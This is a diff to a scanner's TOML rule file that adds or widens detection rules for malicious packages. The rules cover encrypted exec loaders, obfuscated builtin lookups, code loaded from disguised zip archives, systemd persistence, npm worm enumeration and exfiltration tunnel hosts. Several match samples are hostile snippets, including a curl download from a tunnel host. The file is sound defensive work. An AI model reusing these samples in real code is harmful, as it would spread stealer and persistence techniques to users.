@@ -212,6 +212,36 @@ matches = ['''eval(Buffer.from('ZXZpbA==', 'base64').toString());''', '''new Fun
 ignores = ['''const b = Buffer.from(s, "base64"); return b.map(function (x) { return x })''', '''base64,${Buffer.from(JSON.stringify(Ke),"utf8").toString("base64")}`)}\n//# sourceURL=x\n`;return eval(re)''']
 
 [[rule]]
+id = "KS-EXE-035"
+name = "Decrypted Code Executed"
+severity = "critical"
+category = "obfuscation"
+description = "Ciphertext decrypted straight into exec / eval (the Fernet-wrapped stealer loaders on PyPI)"
+pattern = '''(?m)(?:^|[^.\w$\n])(?:exec|eval)\s*\(\s*(?:Fernet\s*\([^()\n]{0,120}\)|[\w.]{1,60})\s*\.decrypt\s*\('''
+matches = ['''exec(Fernet(b'FTY_skQmO0wZD673alxcN2Sb=').decrypt(b'gAAAAABmBH3k'))''', '''exec(cipher.decrypt(blob))''']
+ignores = ['''data = Fernet(key).decrypt(token)''', '''self.exec(query.decrypt_field)''']
+
+[[rule]]
+id = "KS-EXE-036"
+name = "Builtin Name Built From Characters"
+severity = "critical"
+category = "obfuscation"
+description = "A builtin looked up by a name spelled from the characters of other objects' repr (`oct.__str__()[...]`): code written not to be read"
+pattern = '''getattr\(\s*__builtins__\s*,\s*\w+\.__(?:str|repr|name|doc)__(?:\(\))?\['''
+matches = ['''x = map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2]''']
+ignores = ['''getattr(__builtins__, name)''']
+
+[[rule]]
+id = "KS-EXE-037"
+name = "Code Imported From Disguised Archive"
+severity = "critical"
+category = "obfuscation"
+description = "Python modules loaded from a zip file named as a certificate, image or data file (zipimport / sys.path)"
+pattern = '''(?:zipimporter\s*\(|sys\.path\.(?:insert|append)\s*\()[^\n;]{0,200}?\.(?:crt|pem|cer|key|typed|pyi|png|jpe?g|gif|ico|svg|dat|bin|txt|json|ttf|woff2?|log|db|so|dll)["'`]'''
+matches = ['''cert = zipimport.zipimporter(f"{os.path.dirname(__file__)}/server.crt").load_module("SSLv2")''', '''sys.path.insert(0, f"{os.path.dirname(__file__)}\\_websocket.typed")''']
+ignores = ['''sys.path.insert(0, os.path.join(here, "vendor.zip"))''', '''zipimporter(egg_path)''']
+
+[[rule]]
 id = "KS-EXE-004"
 name = "nested b64decode"
 severity = "critical"
@@ -573,8 +603,8 @@ name = "Exfiltration Service Endpoint"
 severity = "high"
 category = "exfiltration"
 description = "Request-capture / tunnel / file-drop service used to receive stolen data"
-pattern = '''(?i)(?:(?-u:\b)(?:webhook\.site|requestcatcher\.com|m\.pipedream\.net|interact\.sh|oast\.(?:pro|live|site|online|fun|me)(?-u:\b)|oast-[a-z]+\.|burpcollaborator\.net|oastify\.com|canarytokens\.com|beeceptor\.com|requestbin\.(?:net|com)|hookbin\.com)|(?:(?:https?|wss?)://|hostname["']?\s*[:=]\s*["'`])(?:[\w-]+\.)*(?:ngrok(?:-free)?\.(?:io|app|dev)|lhr\.life|localhost\.run|serveo\.net|trycloudflare\.com|api\.telegram\.org|transfer\.sh|catbox\.moe|bashupload\.com|filev2\.getsession\.org))'''
-matches = ['''https://webhook.site/0b1c''', '''https://abc.m.pipedream.net''', '''hostname: `api.telegram.org`,''', '''socket.gethostbyname(f"{d}.abc.oast.fun")''']
+pattern = '''(?i)(?:(?-u:\b)(?:webhook\.site|requestcatcher\.com|m\.pipedream\.net|interact\.sh|oast\.(?:pro|live|site|online|fun|me)(?-u:\b)|oast-[a-z]+\.|burpcollaborator\.net|oastify\.com|canarytokens\.com|beeceptor\.com|requestbin\.(?:net|com)|hookbin\.com|pinggy(?:-free)?\.link|a\.pinggy\.io)|(?:(?:https?|wss?)://|hostname["']?\s*[:=]\s*["'`])(?:[\w-]+\.)*(?:ngrok(?:-free)?\.(?:io|app|dev)|lhr\.life|localhost\.run|serveo\.net|trycloudflare\.com|api\.telegram\.org|transfer\.sh|catbox\.moe|bashupload\.com|filev2\.getsession\.org))'''
+matches = ['''https://webhook.site/0b1c''', '''https://abc.m.pipedream.net''', '''curl -fsSL rqnyz-2605-7280.run.pinggy-free.link/npm/-/binary/telemetry''', '''hostname: `api.telegram.org`,''', '''socket.gethostbyname(f"{d}.abc.oast.fun")''']
 ignores = ['''"nfshost.com","ngrok.io","nh-serv.co.uk"''']
 
 [[rule]]
@@ -657,8 +687,8 @@ description = "javascript-obfuscator output (string-array decoder)"
 # The second form is the tool's base64 string decoder itself: with
 # `identifierNamesGenerator: mangled` nothing is called _0x… any more, and the
 # arithmetic stays (date-fns-formatter).
-pattern = '''(?:(?:var|const|let|function)\s+_0x[0-9a-f]{4,6}(?-u:\b)|0xff\s*&\s*[\w$]+\s*>>\s*\(\s*-0x2\s*\*\s*[\w$]+\s*&\s*0x6\s*\))'''
-matches = ['''function _0x2470(){return _0x2e306f;}''', '''R+=String['fromCharCode'](0xff&d>>(-0x2*N&0x6)):0x0''']
+pattern = '''(?:(?:var|const|let|function)\s+_0x[0-9a-f]{4,6}(?-u:\b)|0xff\s*&\s*[\w$]+\s*>>\s*\(\s*-0x2\s*\*\s*[\w$]+\s*&\s*0x6\s*\)|if\s*\(\s*[\w$]+\[\s*['"](?:\\x[0-9a-fA-F]{2}){4,}['"]\s*\]\s*===\s*undefined\s*\))'''
+matches = ['''function _0x2470(){return _0x2e306f;}''', '''R+=String['fromCharCode'](0xff&d>>(-0x2*N&0x6)):0x0''', '''let f=X[U];if(t['\x4a\x51\x4d\x67\x43\x59']===undefined){var y=function(c){''']
 ignores = ['''var a=0x1f;''']
 
 [[rule]]
@@ -781,13 +811,33 @@ pattern = '''\.(?:bashrc|zshrc|bash_profile)(?-u:\b)'''
 matches = ['''path.join(homeDir, '.zshrc')''']
 
 [[rule]]
+id = "KS-FSW-003"
+name = "Systemd User Service Installed"
+severity = "high"
+category = "file_write"
+description = "Writes or enables a systemd user unit (~/.config/systemd/user, `systemctl --user enable`): survives logout and reboot"
+pattern = '''(?:\.config[/\\]+systemd[/\\]+user|["'`]systemd["'`]\s*,\s*["'`]user["'`]|systemctl\s+--user\s+enable)'''
+matches = ['''const systemdUserDir = path.join(homeDir, '.config', 'systemd', 'user');''', '''execSync(`systemctl --user enable ${SERVICE_NAME}.service`)''', '''unit = os.path.expanduser("~/.config/systemd/user/x.service")''']
+ignores = ['''systemctl --user status''']
+
+[[rule]]
+id = "KS-SUP-014"
+name = "npm Maintainer Package Enumeration"
+severity = "high"
+category = "supply_chain"
+description = "Lists every package an npm account maintains: the first step of a worm that republishes them with stolen tokens"
+pattern = '''-/v1/search\?text=maintainer:'''
+matches = ['''const url = `https://registry.npmjs.org/-/v1/search?text=maintainer:${encodeURIComponent(''']
+
+[[rule]]
 id = "KS-SUP-011"
 name = "npm Publish from Code"
 severity = "medium"
 category = "supply_chain"
 description = "Runs `npm publish` from a script (release tooling, or a registry spam publisher)"
-pattern = '''(?-u:\b)(?:exec|execSync|spawn|spawnSync|execa)\s*\(\s*["'`]npm\s+publish(?-u:\b)'''
-matches = ['''exec('npm publish --access public', (error) => {''']
+# Second form: a project's own wrapper around execSync, `run('npm publish …')`.
+pattern = '''(?-u:\b)(?:exec|execSync|spawn|spawnSync|execa|run|sh)\s*\(\s*["'`]npm\s+publish(?-u:\b)'''
+matches = ['''exec('npm publish --access public', (error) => {''', '''run('npm publish --access public --tag latest', {''']
 ignores = ['''execa('npm', ['publish'])''']
 
 # `eval(data)` right after a fetch callback, or Python's `exec(urlopen(...))`:
